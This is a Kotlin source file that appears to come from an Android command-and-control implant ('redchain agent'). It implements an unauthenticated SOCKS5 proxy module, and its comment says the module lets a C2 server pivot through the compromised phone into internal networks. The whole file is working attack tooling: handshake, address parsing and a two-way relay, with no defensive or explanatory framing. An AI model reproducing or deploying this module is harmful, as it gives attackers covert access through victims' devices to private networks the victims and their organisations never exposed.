package com.redchain.agent.modules

import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import org.json.JSONObject
import java.io.InputStream
import java.io.OutputStream
import java.net.ServerSocket
import java.net.Socket
import java.nio.ByteBuffer

/**
 * SOCKS5 Proxy Server running on phone
 * Allows C2 server to pivot through phone to access internal networks
 */
object Socks5ProxyModule {

    private var serverSocket: ServerSocket? = null
    private var isRunning = false

    suspend fun execute(params: JSONObject): JSONObject = withContext(Dispatchers.IO) {
        val port = params.optInt("port", 1080)

        try {
            startProxy(port)
            JSONObject().apply {
                put("status", "started")
                put("port", port)
                put("message", "SOCKS5 proxy running on port $port")
            }
        } catch (e: Exception) {
            JSONObject().apply {
                put("status", "failed")
                put("error", e.message)
            }
        }
    }

    private fun startProxy(port: Int) {
        if (isRunning) return

        Thread {
            try {
                serverSocket = ServerSocket(port)
                isRunning = true

                while (isRunning) {
                    val client = serverSocket?.accept() ?: break

                    // Handle each client in separate thread
                    Thread {
                        handleClient(client)
                    }.start()
                }
            } catch (e: Exception) {
                e.printStackTrace()
            }
        }.start()
    }

    private fun handleClient(client: Socket) {
        try {
            val input = client.getInputStream()
            val output = client.getOutputStream()

            // SOCKS5 handshake
            val greeting = ByteArray(2)
            input.read(greeting)

            if (greeting[0] != 0x05.toByte()) {
                client.close()
                return
            }

            // No authentication
            output.write(byteArrayOf(0x05, 0x00))
            output.flush()

            // Read request
            val request = ByteArray(4)
            input.read(request)

            val cmd = request[1]
            val atyp = request[3]

            if (cmd != 0x01.toByte()) { // Only support CONNECT
                client.close()
                return
            }

            // Read destination address
            val (destAddr, destPort) = when (atyp.toInt()) {
                0x01 -> { // IPv4
                    val addr = ByteArray(4)
                    input.read(addr)
                    val port = ByteArray(2)
                    input.read(port)

                    val address = addr.joinToString(".") { (it.toInt() and 0xFF).toString() }
                    val portNum = ((port[0].toInt() and 0xFF) shl 8) or (port[1].toInt() and 0xFF)

                    Pair(address, portNum)
                }
                0x03 -> { // Domain name
                    val len = input.read()
                    val domain = ByteArray(len)
                    input.read(domain)
                    val port = ByteArray(2)
                    input.read(port)

                    val address = String(domain)
                    val portNum = ((port[0].toInt() and 0xFF) shl 8) or (port[1].toInt() and 0xFF)

                    Pair(address, portNum)
                }
                else -> {
                    client.close()
                    return
                }
            }

            // Connect to destination
            val remote = Socket(destAddr, destPort)

            // Send success response
            output.write(byteArrayOf(0x05, 0x00, 0x00, 0x01, 0, 0, 0, 0, 0, 0))
            output.flush()

            // Relay data bidirectionally
            val clientToRemote = Thread {
                relay(input, remote.getOutputStream())
            }

            val remoteToClient = Thread {
                relay(remote.getInputStream(), output)
            }

            clientToRemote.start()
            remoteToClient.start()

            clientToRemote.join()
            remoteToClient.join()

            remote.close()
            client.close()

        } catch (e: Exception) {
            e.printStackTrace()
            client.close()
        }
    }

    private fun relay(input: InputStream, output: OutputStream) {
        try {
            val buffer = ByteArray(8192)
            var read: Int

            while (input.read(buffer).also { read = it } != -1) {
                output.write(buffer, 0, read)
                output.flush()
            }
        } catch (e: Exception) {
            // Connection closed
        }
    }

    fun stop() {
        isRunning = false
        serverSocket?.close()
    }
}
